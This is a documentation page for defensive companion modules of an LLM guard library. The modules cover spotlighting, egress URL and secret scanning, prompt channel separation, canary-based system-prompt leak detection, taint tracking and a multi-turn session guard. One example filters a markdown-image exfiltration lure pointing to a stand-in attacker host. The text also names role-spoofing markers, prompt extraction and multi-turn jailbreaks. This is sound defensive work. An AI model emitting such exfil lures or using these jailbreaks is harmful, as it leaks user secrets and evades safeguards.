# Companions

Zero-dependency defense-in-depth utilities that ride on Tier 0. The gaps a stateless
single-message filter *structurally cannot see* — each shipped as a separate subpath
(see [subpath exports](./README.md#subpath-exports)) so the zero-config Tier-0 path is
unchanged. All companions are edge-safe (zero Node builtins).

---

## Spotlight — `opensentry/spotlight`

Makes untrusted content unmistakably "data, not instructions" (Microsoft Spotlighting,
arXiv 2403.14720 — reports ASR dropping from >50% to <3%). Three modes:

```ts
import { spotlight } from 'opensentry/spotlight';

// datamark (default): prefix each line with a private-use marker
const r = spotlight('Hello\nWorld');
// r.text === '\uE000Hello\n\uE000World'

// delimit: wrap in a random unpredictable delimiter
const r2 = spotlight('Hello', { mode: 'delimit' });
// r2.text === '---opensentry-spotlight-<random>---\nHello\n---opensentry-spotlight-<random>---'

// encode: base64-encode so content is non-instructional
const r3 = spotlight('Hello', { mode: 'encode' });
// r3.text === 'SGVsbG8='
```

### Options

| Option | Default | Notes |
|---|---|---|
| `mode` | `'datamark'` | `'delimit'` \| `'datamark'` \| `'encode'` |
| `marker` | `'\uE000'` (Private Use Area) | datamark token |
| `randomDelimiter` | crypto-random hex | delimit mode — must be unpredictable per request |

### Forgery guarantee

If the untrusted input already contains the chosen delimiter/marker, spotlight
**throws** — preventing delimiter-forgery attacks. This is the contract the input guard
relies on (the guard guarantees the input can't forge the markers).

Edge-safe: uses only web globals (`btoa`, `TextEncoder`, `crypto.getRandomValues`).

---

## Egress filter — `opensentry/egress`

Blocks data exfiltration **on the way OUT** — disallowed URLs (markdown-image lures,
bare URLs) **and**, opt-in, leaked secrets / PII in the payload.

### URL allowlist (always on)

Disallowed URLs hard-block; optionally strip them from the output:

```ts
import { egressFilter } from 'opensentry/egress';

const r = egressFilter('![data](https://evil.com/exfil?d=secret)', {
  allowlist: ['https://api.example.com', /^https:\/\/cdn\.example\.com\//],
  stripDisallowed: true,
});
// r.verdict === 'block'
// r.safe === '' (URL stripped)
```

### Secret scanning (opt-in)

Known key shapes (OpenAI / GitHub / AWS / JWT / Slack / Google) + high-entropy token
runs → `secret_egress`. **Flag-not-block** (output-side, blocking a response is costly).
`secretAllowlist` for known-safe tokens:

```ts
const s = egressFilter('leaked: sk-proj-abc123def456ghi789jkl012mno345pqr678', {
  allowlist: [],
  scanSecrets: true,
  secretAllowlist: [/^sk-proj-public-/, 'AKIAEXAMPLE'], // known-safe tokens
});
// s.verdict === 'flag', s.reasons has secret_egress
```

### PII scanning (opt-in, defaults off — locale-sensitive)

Email / phone / card (Luhn-validated) / SSN, or BYO `RegExp[]` → `pii_egress`.
Flag-not-block:

```ts
const p = egressFilter('Reach me at alice@example.com', {
  allowlist: [],
  scanPii: true,        // built-in patterns, or pass RegExp[] for custom
});
// p.verdict === 'flag', p.reasons has pii_egress
```

### `EgressPolicy`

```ts
interface EgressPolicy {
  allowlist: (string | RegExp)[];       // URL allowlist (always on)
  stripDisallowed?: boolean;            // strip disallowed URLs from output
  scanSecrets?: boolean;                // known key shapes + high-entropy runs → secret_egress
  secretAllowlist?: (string | RegExp)[];// known-safe tokens
  scanPii?: boolean | RegExp[];         // true → built-ins; or custom patterns → pii_egress
}
```

Returns `{ safe, verdict, reasons }`. Verdict is `block` only on a disallowed exfil URL
(hard-block); secrets/PII are `flag`.

---

## Prompt assembler — `opensentry/prompt`

Channel separation: assemble prompts from typed fields, **never string concatenation**.
Untrusted content is role-marker-stripped (prevents role spoofing) + auto-spotlighted
(datamark). The trusted system prompt passes through unchanged as the system message.
Optionally auto-inject a [canary](#canary--opensentrycanary):

```ts
import { assemble } from 'opensentry/prompt';
import { createCanary } from 'opensentry/canary';

const canary = createCanary();
const { messages, canary: injected } = assemble({
  system: 'You are a helpful assistant.',
  untrusted: [
    { source: 'retrieved', content: ragChunk },
    { source: 'web', content: webpage },
  ],
  canary, // optional — injected into the system message
});
// messages[0] → { role: 'system', content: 'You are a helpful assistant.\n\n[internal-reference:<canary>]' }
// messages[1] → { role: 'user', content: '\uE000...datamarked RAG...' }
// messages[2] → { role: 'user', content: '\uE000...datamarked web...' }
// Later: detectCanaryLeak(modelOutput, [canary]) → deterministic system-prompt-extraction check.
```

Strips forged role/template markers (`<|im_start|>`, `[system]`, `</system>`, etc.)
from untrusted content before spotlighting. This is OWASP LLM01:2025's core
recommendation: keep trusted instructions and untrusted data in distinct typed fields.

---

## Canary — `opensentry/canary`

Deterministic, near-zero-FP system-prompt-leak detection. Inject an unguessable 128-bit
nonce into the system prompt; if it ever appears in model output, the prompt was
extracted — a **confirmed** extraction, not a heuristic guess.

```ts
import { createCanary, injectCanary, detectCanaryLeak } from 'opensentry/canary';

const canary = createCanary();                     // 'opensentry-canary-<32 hex chars>'
const prompt = injectCanary('You are...', canary); // appends [internal-reference:<canary>]

// ...after the model responds...
const leak = detectCanaryLeak(modelOutput, [canary]);
if (leak.leaked) {
  // confirmed extraction — canary_leak is a hard-block reason
}
```

`assemble({ canary })` (above) auto-injects. `detectCanaryLeak` is intended for the
output/egress scan path; a hit maps to the `canary_leak` reason (hard-block). The
prefix makes the canary grep-able in logs. Edge-safe (`crypto.getRandomValues`).

---

## Taint — `opensentry/taint`

Provenance-passing for indirect-injection defense — "the XSS of the AI-agent era". JS
has no true taint propagation, so this is an explicit, **honest heuristic**: mark spans
of untrusted-origin text and later ask whether a candidate string (e.g. a tool call's
args) contains any.

```ts
import { createTaintTracker } from 'opensentry/taint';

const tracker = createTaintTracker();
tracker.mark(retrievedDoc, 'retrieved');       // register untrusted-origin spans
tracker.mark(webContent, 'web');

const hit = tracker.containsTainted(maybePastedArgs);
// hit.tainted, hit.sources, hit.marks

// Wire into checkToolCall: untrusted-origin text reaching a privileged tool call →
// tainted_data_flow + fail-closed.
```

### `TaintTracker`

| Method | Returns | Notes |
|---|---|---|
| `mark(text, source)` | the same `text` (passthrough) | Register an untrusted-origin span. Use inline: `const x = tracker.mark(doc, 'retrieved')` |
| `containsTainted(text)` | `{ tainted, sources, marks }` | Substring lookup. Short-circuits when the candidate is shorter than every mark |
| `originOf(text)` | `Source \| undefined` | Best-effort origin lookup |
| `marks()` | readonly `TaintMark[]` | Audit / serialization |
| `clear()` | — | Reset |

**No effect unless a tracker is wired and `checkToolCall` is gated** — it flags *data
flow into privileged actions*, not content. See the
[agentic gating recipe](./recipes.md#3-agentic-tool-call-gating).

---

## Session — `opensentry/session`

Stateful multi-turn guard. Crescendo, Bad Likert Judge, and many-shot exceed ~70%
success because **no single turn is flaggable**. `createSessionGuard` wraps a `Guard`
with per-`conversationId` LRU state (+ pluggable `SessionStore` for distributed
deployments) and folds three session-level signals via noisy-OR:

- `cumulative_risk` — decaying sum of per-turn scores crosses a threshold (slow
  escalation trips even when each turn is individually benign)
- `session_escalation` — score gradient across turns exceeds `escalationDelta` (Crescendo)
- `manyshot_density` — a single turn injects many synthetic `user:`/`assistant:` role pairs

Flag-weighted + decaying; **can only escalate, never de-escalate**.

```ts
import { createGuard } from 'opensentry';
import { createSessionGuard } from 'opensentry/session';

const guard = createGuard();
const sg = createSessionGuard(guard, { decay: 0.8, escalationDelta: 0.3 });

// Per turn:
const r = await sg.check(userTurn, { conversationId: 'conv-123', source: 'user' });
// r.reasons may now include cumulative_risk / session_escalation / manyshot_density

sg.reset('conv-123');           // clear state on conversation end
sg.stateOf('conv-123');         // audit: { cumulativeScore, turns, refusedTopics }
```

### `SessionGuardOptions`

| Option | Default | Notes |
|---|---|---|
| `store` | in-memory LRU | BYO `SessionStore` for Redis/DB |
| `decay` | `0.8` | Per-turn multiplier on `cumulativeScore` |
| `escalationDelta` | `0.3` | Turn-over-turn score rise that trips `session_escalation` |
| `manyShotTurnThreshold` | `8` | Synthetic role-marker count that trips `manyshot_density` |
| `cumulativeRiskThreshold` | `0.6` | Decaying-sum level that trips `cumulative_risk` |
| `ttlMs` | `30 * 60 * 1000` | Conversation state TTL |
| `maxEntries` | `1024` | Default store LRU size (ignored if `store` supplied) |
| `thresholds` | project defaults | Session-signal verdict mapping |

### `SessionStore` (distributed deployments)

```ts
interface SessionStore {
  get(id: string): SessionState | undefined;
  set(id: string, s: SessionState): void;
  delete(id: string): void;
}
```

Implement this against Redis/DB for distributed deployments. The default is an in-memory
LRU with TTL eviction. Session signals are **flag-weighted, never hard-block**, and
`cumulativeScore` decays so a single spike doesn't poison a long benign conversation.

The session guard preserves the wrapped guard's mode (`shadow`/`soft`/`enforce`) so a
`soft` block→flag downgrade survives — it re-derives the mode from `GuardResult.mode`
rather than collapsing `soft`→`enforce`.
